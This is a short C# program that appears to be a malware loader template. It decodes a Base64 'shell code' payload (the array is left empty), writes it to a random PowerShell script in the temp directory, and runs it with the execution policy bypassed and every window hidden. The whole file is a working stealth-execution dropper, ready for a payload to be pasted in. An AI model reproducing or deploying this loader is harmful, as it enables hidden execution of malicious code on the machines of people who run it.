using System.Diagnostics;
using System.Text;

// Base64 shell code goes here.
var a = new[] {
  ""
};

var b = string.Join("", a);
var c = Encoding.UTF8.GetString(Convert.FromBase64String(b));
var d = Path.Combine(Path.GetTempPath(), Guid.NewGuid() + ".ps1");
File.WriteAllText(d, c);
var p = new ProcessStartInfo
{
    FileName = "powershell.exe",
    Arguments = $"-ExecutionPolicy Bypass -WindowStyle Hidden -File \"{d}\"",
    UseShellExecute = false,
    CreateNoWindow = true,
    WindowStyle = ProcessWindowStyle.Hidden
};
Process.Start(p);
